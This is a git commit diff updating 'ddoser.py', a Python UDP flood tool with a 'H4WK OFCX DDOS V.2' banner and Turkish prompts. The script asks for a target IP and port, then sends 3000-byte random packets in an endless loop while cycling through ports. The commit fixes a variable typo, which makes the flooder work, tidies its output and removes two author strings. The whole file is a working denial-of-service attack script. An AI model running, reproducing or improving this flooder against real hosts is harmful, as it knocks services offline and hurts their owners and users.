16ce0654795011021ce5846d9240dcc0127b4818
hawk.0fcx <67156465+hawk-unity@users.noreply.github.com>
2021-07-20 02:45:00 +0300

    Update ddoser.py

--- ddoser.py
+++ ddoser.py
@@ -1,13 +1,11 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 import sys
-import os 
-import time 
+import os
+import time
 import socket
-import random 
+import random
 from datetime import datetime
-author2 = "fenrir scripti çalsana :D"
-author3 = "bu script fenrir kolpası için ddosu öğrenmesi için yazıldı"
 now = datetime.now()
 hour = now.hour
 minute = now.minute
@@ -19,20 +17,22 @@ bytes = random._urandom(3000)
 os.system("clear")
 banner = """
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-         
+
      H4WK OFCX DDOS V.2
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 """
 print(banner)
 ip = raw_input("Hedef İp => ")
-port = raw_input("Hedef Port => ")
-
+port = input("Hedef Port => ")
+os.system("clear")
 sent = 0
 while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
-     port = porti + 1
-     print "Gönderilen %s Paket  %s Bağlantı noktası:%s"%(sent,ip,port)
+     port = port + 1
+     print "------------------------------------------------------------------------------------"
+     print " Gönderilen Paket => %s \n İp Adres =>  %s \n Bağlantı => :%s"%(sent,ip,port)
+     print "------------------------------------------------------------------------------------"
      if port == 65534:
         port = 1
